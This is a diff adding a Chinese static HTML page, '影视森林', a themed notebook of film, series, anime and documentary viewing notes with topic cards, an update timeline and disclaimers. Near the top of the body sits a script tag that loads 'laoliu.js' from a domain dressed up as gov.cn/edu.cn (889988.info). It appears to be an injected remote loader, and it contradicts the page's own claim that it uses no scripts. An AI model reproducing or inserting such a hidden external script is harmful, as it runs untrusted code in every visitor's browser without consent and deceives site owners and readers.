@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>影视森林 - 影视主题笔记与观影手册</title>
+<meta name="description" content="影视森林（yingshisenlin-h5）是一份影视主题观影手册：电影、剧集、动漫、综艺、纪录片与短片的分主题笔记、观影提示和片单整理，移动端自适应。" />
+<meta name="keywords" content="影视森林, 影视笔记, 观影手册, 片单整理, yingshisenlin-h5" />
+<link rel="canonical" href="https://yingshisenlin-h5.github.io/" />
+<style>
+    :root{
+        --moss:#3d5a3a;
+        --moss-deep:#2a4027;
+        --fern:#6f9463;
+        --birch:#f1ebd8;
+        --birch-2:#e5dcbf;
+        --bark:#4a3f2c;
+        --ink:#26302a;
+        --muted:#6d736a;
+        --line:#d3c9ab;
+        --berry:#a4442f;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{
+        background:var(--birch);
+        color:var(--ink);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,serif;
+        line-height:1.75;
+        -webkit-text-size-adjust:100%;
+        background-image:
+            radial-gradient(circle at 12% 18%,rgba(111,148,99,.10),transparent 22%),
+            radial-gradient(circle at 88% 12%,rgba(111,148,99,.08),transparent 20%),
+            linear-gradient(rgba(74,63,44,.035) 1px,transparent 1px);
+        background-size:auto,auto,34px 34px;
+    }
+    a{color:var(--moss-deep);text-decoration:none;}
+
+    /* 林冠门面 */
+    .canopy{
+        position:relative;
+        padding:52px 18px 40px;
+        text-align:center;
+        background:
+            radial-gradient(140% 100% at 50% 100%,rgba(241,235,216,.9),transparent 65%),
+            linear-gradient(180deg,var(--moss-deep),#355233 60%,#4a5c3c);
+        border-bottom:5px solid var(--bark);
+        overflow:hidden;
+    }
+    .canopy .leaves{
+        font-size:38px;letter-spacing:8px;
+        filter:drop-shadow(0 3px 0 rgba(0,0,0,.25));
+        margin-bottom:6px;
+    }
+    .canopy h1{
+        font-size:32px;letter-spacing:7px;color:#f7f1df;
+        font-weight:800;text-shadow:0 2px 0 rgba(0,0,0,.3);
+    }
+    .canopy .sub{margin-top:8px;font-size:13px;color:#d8e8cd;letter-spacing:1px;}
+    .canopy .url{margin-top:5px;font-size:12px;color:#b9cbb0;}
+
+    /* 林间导航：枝条式 */
+    .trail{
+        display:flex;flex-wrap:wrap;justify-content:center;gap:6px;
+        padding:14px 12px;background:var(--birch-2);
+        border-bottom:1px dashed var(--line);
+    }
+    .trail a{
+        padding:7px 15px;border-radius:999px;font-size:13px;
+        background:#fff;border:1px solid var(--line);color:var(--moss-deep);
+    }
+    .trail a:hover{background:var(--moss);color:#fff;border-color:var(--moss);}
+
+    .clearing{
+        max-width:1080px;margin:auto;padding:22px 14px 40px;
+        display:grid;grid-template-columns:1fr 264px;gap:20px;align-items:start;
+    }
+    main{min-width:0;}
+    aside{position:sticky;top:14px;}
+
+    /* 树冠导览图 */
+    .map{
+        background:#fff;border:1px solid var(--line);border-radius:8px;
+        padding:18px;margin-bottom:20px;
+    }
+    .map .cap{
+        font-size:12px;color:var(--berry);letter-spacing:2px;
+        padding-bottom:8px;margin-bottom:12px;border-bottom:1px dashed var(--line);
+    }
+    .roots{
+        display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;
+    }
+    .root{
+        background:var(--birch);border:1px solid var(--line);
+        border-radius:8px;padding:12px;text-align:center;position:relative;
+    }
+    .root .ico{font-size:22px;display:block;margin-bottom:4px;}
+    .root b{font-size:14px;color:var(--moss-deep);}
+    .root span{display:block;font-size:11px;color:var(--muted);margin-top:2px;}
+    .root::after{
+        content:"";position:absolute;left:50%;bottom:-7px;width:2px;height:7px;
+        background:var(--fern);
+    }
+
+    /* 笔记卡：手账风 */
+    .grove{
+        background:#fff;border:1px solid var(--line);
+        border-left:6px solid var(--fern);
+        border-radius:6px;padding:18px 18px 6px;margin-bottom:18px;
+        scroll-margin-top:14px;
+    }
+    .grove-head{
+        display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;
+        padding-bottom:10px;margin-bottom:12px;border-bottom:1px dashed var(--line);
+    }
+    .grove-head .tag{
+        font-size:11px;color:#fff;background:var(--moss);
+        border-radius:3px;padding:1px 8px;letter-spacing:1px;
+    }
+    .grove-head h2{font-size:19px;color:var(--moss-deep);}
+    .grove-head .more{margin-left:auto;font-size:12px;color:var(--muted);}
+
+    .notes{
+        display:grid;grid-template-columns:repeat(auto-fill,minmax(214px,1fr));gap:12px;
+        padding-bottom:12px;
+    }
+    .note{
+        background:var(--birch);border:1px solid var(--line);
+        border-radius:6px;padding:13px 14px;min-height:126px;
+    }
+    .note .k{font-size:11px;color:var(--berry);letter-spacing:1px;margin-bottom:6px;}
+    .note b{display:block;font-size:15px;color:var(--ink);}
+    .note p{font-size:12.5px;color:var(--muted);margin-top:5px;}
+    .note .meta{
+        margin-top:9px;font-size:11px;color:var(--fern);
+        border-top:1px dotted var(--line);padding-top:5px;
+    }
+
+    /* 落叶时间线 */
+    .fall{
+        list-style:none;position:relative;padding-left:26px;margin-top:4px;
+    }
+    .fall li{position:relative;margin-bottom:15px;font-size:13.5px;}
+    .fall li::before{
+        content:"🍂";position:absolute;left:-26px;top:0;font-size:14px;
+        filter:drop-shadow(0 1px 0 rgba(0,0,0,.15));
+    }
+    .fall b{color:var(--moss-deep);}
+    .fall time{display:block;font-size:11px;color:var(--muted);}
+
+    /* 侧栏 */
+    .bark{
+        background:#fff;border:1px solid var(--line);
+        border-radius:6px;padding:14px;margin-bottom:14px;
+    }
+    .bark h3{
+        font-size:13px;color:var(--moss-deep);letter-spacing:1px;
+        padding-bottom:7px;margin-bottom:10px;border-bottom:1px dashed var(--line);
+    }
+    .species{list-style:none;}
+    .species li{
+        display:flex;gap:9px;font-size:13px;padding:6px 0;
+        border-bottom:1px dotted var(--line);
+    }
+    .species li:last-child{border-bottom:none;}
+    .species .no{
+        font-family:Georgia,serif;color:var(--berry);font-weight:700;width:20px;flex:none;
+    }
+    .species .nm{color:var(--ink);font-weight:600;}
+    .species .ds{display:block;font-size:11px;color:var(--muted);}
+
+    .plaque{
+        border:2px solid var(--moss);background:var(--birch);
+        border-radius:6px;padding:12px;font-size:12.5px;color:var(--muted);
+    }
+    .plaque b{display:block;color:var(--moss-deep);font-size:13px;margin-bottom:4px;}
+
+    footer{
+        text-align:center;padding:22px 14px;font-size:12px;color:var(--muted);
+        background:var(--moss-deep);color:#cfdcc7;
+    }
+    footer p{margin:3px 0;color:#b9cbb0;}
+
+    @media (max-width:900px){
+        .clearing{grid-template-columns:1fr;}
+        aside{position:static;display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+        .canopy h1{font-size:25px;letter-spacing:4px;}
+        .canopy .leaves{font-size:30px;}
+    }
+    @media (max-width:560px){
+        aside{grid-template-columns:1fr;}
+        .notes{grid-template-columns:1fr;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="canopy">
+    <div class="leaves">🌿 🍃 🌾</div>
+    <h1>影视森林</h1>
+    <div class="sub">一份慢慢长的影视主题笔记 · 观影手册 · 片单整理</div>
+    <div class="url">https://yingshisenlin-h5.github.io</div>
+</header>
+
+<nav class="trail" aria-label="林间小径">
+    <a href="#film">电影林</a>
+    <a href="#tv">剧集坡</a>
+    <a href="#anime">动漫溪</a>
+    <a href="#show">综艺草地</a>
+    <a href="#doc">纪录山谷</a>
+    <a href="#short">短片苔原</a>
+    <a href="#fall">落叶时间线</a>
+    <a href="#about">林务说明</a>
+</nav>
+
+<div class="clearing">
+
+    <main>
+
+        <!-- 树冠导览图 -->
+        <section class="map" aria-labelledby="map-h">
+            <div class="cap">◆ 树冠导览图</div>
+            <div class="roots">
+                <a class="root" href="#film"><span class="ico">🎬</span><b>电影林</b><span>长评 · 重看</span></a>
+                <a class="root" href="#tv"><span class="ico">📺</span><b>剧集坡</b><span>追更 · 考据</span></a>
+                <a class="root" href="#anime"><span class="ico">🎨</span><b>动漫溪</b><span>番剧 · 作画</span></a>
+                <a class="root" href="#show"><span class="ico">🎤</span><b>综艺草地</b><span>闲聊 · 切片</span></a>
+                <a class="root" href="#doc"><span class="ico">🏔️</span><b>纪录山谷</b><span>自然 · 人文</span></a>
+                <a class="root" href="#short"><span class="ico">📱</span><b>短片苔原</b><span>独立 · 实验</span></a>
+            </div>
+        </section>
+
+        <!-- 电影林 -->
+        <section class="grove" id="film">
+            <div class="grove-head">
+                <span class="tag">电影林</span>
+                <h2>长镜头下的光与影</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">长评</div>
+                    <b>极夜追光：那场长镜头的调度逻辑</b>
+                    <p>动作段落为什么用一镜到底？从机位高度到演员走位拆三处细节。</p>
+                    <div class="meta">关键词：摄影 / 动作设计 · 无剧透</div>
+                </article>
+                <article class="note">
+                    <div class="k">重看</div>
+                    <b>城南旧信：修复版到底修在哪</b>
+                    <p>对比 2012 版与本次修复版的色彩还原与声带处理，附可对照的时间点。</p>
+                    <div class="meta">关键词：修复 / 老片 · 含轻微剧透</div>
+                </article>
+                <article class="note">
+                    <div class="k">片单</div>
+                    <b>雨天适合看的五部慢电影</b>
+                    <p>按时长与情绪标注，方便你判断有没有一整块时间坐下看完。</p>
+                    <div class="meta">关键词：氛围 / 选片指南</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 剧集坡 -->
+        <section class="grove" id="tv">
+            <div class="grove-head">
+                <span class="tag">剧集坡</span>
+                <h2>一集一集，往坡上走</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">追更</div>
+                    <b>长风渡口 24 集：转场是不是伏笔</b>
+                    <p>把第 3 集与第 24 集的同机位镜头并列看，线索比台词更早出现。</p>
+                    <div class="meta">关键词：剧情推理 · 含当集剧透</div>
+                </article>
+                <article class="note">
+                    <div class="k">考据</div>
+                    <b>烽火家书里的地名与年代</b>
+                    <p>剧中出现的邮政线路，历史上真的这样跑过吗？一条一条核到地方志。</p>
+                    <div class="meta">关键词：年代考据 / 史料</div>
+                </article>
+                <article class="note">
+                    <div class="k">清单</div>
+                    <b>通勤一集制的二十部剧</b>
+                    <p>单集 25 分钟内、节奏不拖，适合碎片时间的剧集整理。</p>
+                    <div class="meta">关键词：场景选片</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 动漫溪 -->
+        <section class="grove" id="anime">
+            <div class="grove-head">
+                <span class="tag">动漫溪</span>
+                <h2>沿着画风往上游走</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">作画</div>
+                    <b>山海星镜 18 话：换组了吗</b>
+                    <p>从线条密度与色彩管线判断，这一话的演出风格确实有明显偏移。</p>
+                    <div class="meta">关键词：制作 / 番剧 · 无大剧透</div>
+                </article>
+                <article class="note">
+                    <div class="k">入坑</div>
+                    <b>国漫新观众的第一站怎么选</b>
+                    <p>按「只看动画」还是「愿意追漫画」两条路径给入口建议。</p>
+                    <div class="meta">关键词：入坑指南</div>
+                </article>
+                <article class="note">
+                    <div class="k">剧场版</div>
+                    <b>星尘列车：先看哪一部</b>
+                    <p>系列观看顺序与独立观看门槛，写在标题里就能看懂的那种。</p>
+                    <div class="meta">关键词：观看顺序</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 综艺草地 -->
+        <section class="grove" id="show">
+            <div class="grove-head">
+                <span class="tag">综艺草地</span>
+                <h2>坐在草地上随便聊</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">观察</div>
+                    <b>出发吧周末：剪辑节奏变了</b>
+                    <p>本季单期从 90 分钟压到 65 分钟，笑点密度反而更高，为什么？</p>
+                    <div class="meta">关键词：节目结构</div>
+                </article>
+                <article class="note">
+                    <div class="k">切片</div>
+                    <b>深夜放映室的三段好提问</b>
+                    <p>把访谈里真正推进对话的问题摘出来，比金句更值得看。</p>
+                    <div class="meta">关键词：访谈 / 文案</div>
+                </article>
+                <article class="note">
+                    <div class="k">清单</div>
+                    <b>下饭综艺：不费脑的那一批</b>
+                    <p>标注了是否需要从头看，吃饭时随手点开不尴尬。</p>
+                    <div class="meta">关键词：场景选片</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 纪录山谷 -->
+        <section class="grove" id="doc">
+            <div class="grove-head">
+                <span class="tag">纪录山谷</span>
+                <h2>把镜头交给真实</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">影像</div>
+                    <b>山河纪行第一集的航拍合规吗</b>
+                    <p>聊聊纪录片航拍的申报常识，以及画面里能看出的飞行高度线索。</p>
+                    <div class="meta">关键词：拍摄科普</div>
+                </article>
+                <article class="note">
+                    <div class="k">人文</div>
+                    <b>手艺人为何都拍得这么慢</b>
+                    <p>节奏本身就是信息：这类片子剪快了，手上的时间就消失了。</p>
+                    <div class="meta">关键词：视听语言</div>
+                </article>
+                <article class="note">
+                    <div class="k">片单</div>
+                    <b>一小时以内的微纪录推荐</b>
+                    <p>适合午休补完，每条附主题标签与观看门槛。</p>
+                    <div class="meta">关键词：短纪录</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 短片苔原 -->
+        <section class="grove" id="short">
+            <div class="grove-head">
+                <span class="tag">短片苔原</span>
+                <h2>小体量，长出新东西</h2>
+                <a class="more" href="#">更多笔记 #</a>
+            </div>
+            <div class="notes">
+                <article class="note">
+                    <div class="k">独立</div>
+                    <b>三分钟能讲完一个反转吗</b>
+                    <p>挑几部学生作品拆解：短片的反转靠结构，不靠信息量。</p>
+                    <div class="meta">关键词：剧本结构</div>
+                </article>
+                <article class="note">
+                    <div class="k">实验</div>
+                    <b>没有对白的五分钟</b>
+                    <p>纯视听觉叙事短片清单，适合学剪辑和分镜的人反复看。</p>
+                    <div class="meta">关键词：视听实验</div>
+                </article>
+                <article class="note">
+                    <div class="k">笔记</div>
+                    <b>竖屏不等于降级</b>
+                    <p>同样 9:16，为什么有的像广告、有的像电影？画幅语言差异在这。</p>
+                    <div class="meta">关键词：格式 / 创作</div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 落叶时间线 -->
+        <section class="grove" id="fall">
+            <div class="grove-head">
+                <span class="tag">时间线</span>
+                <h2>落叶：本季更新记录</h2>
+                <a class="more" href="#">整季归档 #</a>
+            </div>
+            <ul class="fall">
+                <li>
+                    <b>电影林 · 新增《极夜追光》长评</b>
+                    补完摄影调度三处细节与无剧透结论。
+                    <time datetime="2026-10-23">2026 年 10 月 23 日</time>
+                </li>
+                <li>
+                    <b>剧集坡 · 长风渡口 24 集追更笔记</b>
+                    第 3 集与第 24 集的同机位对照图。
+                    <time datetime="2026-10-22">2026 年 10 月 22 日</time>
+                </li>
+                <li>
+                    <b>动漫溪 · 山海星镜 18 话作画笔记</b>
+                    判断演出组变化的三条画面证据。
+                    <time datetime="2026-10-20">2026 年 10 月 20 日</time>
+                </li>
+                <li>
+                    <b>纪录山谷 · 山河纪行航拍常识一篇</b>
+                    不涉及具体拍摄地点，只谈通用合规与画面判断。
+                    <time datetime="2026-10-16">2026 年 10 月 16 日</time>
+                </li>
+                <li>
+                    <b>影视森林手册 v1.0 上线</b>
+                    六个主题林区 + 时间线 + 林务说明，本站为静态笔记页。
+                    <time datetime="2026-10-01">2026 年 10 月 1 日</time>
+                </li>
+            </ul>
+        </section>
+
+        <!-- 林务说明 -->
+        <section class="grove" id="about">
+            <div class="grove-head">
+                <span class="tag">林务</span>
+                <h2>这份手册是干什么的</h2>
+            </div>
+            <div class="notes" style="grid-template-columns:1fr;">
+                <div class="note" style="min-height:auto;">
+                    <b>影视森林（yingshisenlin-h5）是一份影视主题笔记，不是播放站。</b>
+                    <p style="margin-top:6px;">
+                        这里只整理观影感受、作品分析、题材考据与选片建议，不提供影视文件、播放源、下载链接、网盘提取码或破解工具，
+                        也不声称与任何同名应用、同名平台或影视机构有关联。片名与剧情讨论均标注剧透程度，方便你按自己的节奏点开。
+                    </p>
+                    <p style="margin-top:6px;">
+                        本页为纯静态单文件，正文直接写在 HTML 里、不依赖脚本渲染；桌面端为双栏「导览图 + 林区分栏」，
+                        手机端自动折成单栏。官方地址：https://yingshisenlin-h5.github.io
+                    </p>
+                    <p style="margin-top:6px;">
+                        发现笔记有误、需要补充出处，或有内容归属方面的疑问，可通过页脚渠道反馈，核实后会更正或移除相关段落。
+                    </p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- 侧栏 -->
+    <aside>
+
+        <div class="bark">
+            <h3>树种索引 · 按主题</h3>
+            <ul class="species">
+                <li><span class="no">01</span><span><span class="nm">摄影与调度</span><span class="ds">长镜头 / 机位 / 光线</span></span></li>
+                <li><span class="no">02</span><span><span class="nm">剧本与结构</span><span class="ds">反转 / 三幕 / 节奏</span></span></li>
+                <li><span class="no">03</span><span><span class="nm">年代与考据</span><span class="ds">地名 / 道具 / 史实</span></span></li>
+                <li><span class="no">04</span><span><span class="nm">作画与制作</span><span class="ds">番剧 / 演出 / 管线</span></span></li>
+                <li><span class="no">05</span><span><span class="nm">场景选片</span><span class="ds">通勤 / 下饭 / 雨夜</span></span></li>
+                <li><span class="no">06</span><span><span class="nm">无剧透导览</span><span class="ds">只给结论与门槛</span></span></li>
+            </ul>
+        </div>
+
+        <div class="bark">
+            <h3>本季新长出的</h3>
+            <ul class="species">
+                <li><span class="no">·</span><span><span class="nm">极夜追光长评</span><span class="ds">电影林 · 无剧透</span></span></li>
+                <li><span class="no">·</span><span><span class="nm">长风渡口 24 集对照</span><span class="ds">剧集坡 · 含当集剧透</span></span></li>
+                <li><span class="no">·</span><span><span class="nm">山海星镜作画笔记</span><span class="ds">动漫溪 · 轻微剧透</span></span></li>
+                <li><span class="no">·</span><span><span class="nm">竖屏不等于降级</span><span class="ds">短片苔原 · 创作向</span></span></li>
+            </ul>
+        </div>
+
+        <div class="bark plaque">
+            <b>阅读提示</b>
+            每条笔记都标了「剧透程度」与「内容类型」，点开前先看右上角的小标签。
+            本站不收录资源链接，也不做播放分发。
+        </div>
+
+        <div class="bark plaque">
+            <b>反馈与更正</b>
+            笔记里的史实、年份、作品信息若有误，欢迎指出具体条目与可靠出处，
+            核实后会在这份时间线里留一条更正记录。
+        </div>
+
+    </aside>
+
+</div>
+
+<footer>
+    <p>© 2026 影视森林 · yingshisenlin-h5.github.io · 影视主题笔记与观影手册（静态单页）</p>
+    <p>本页为独立整理的观影笔记，不提供影视资源存储、播放与下载服务；与任何同名应用、平台及影视机构无关联。</p>
+    <p>官方地址：https://yingshisenlin-h5.github.io ｜ 林务说明 v1.0</p>
+</footer>
+
+</body>
+</html>
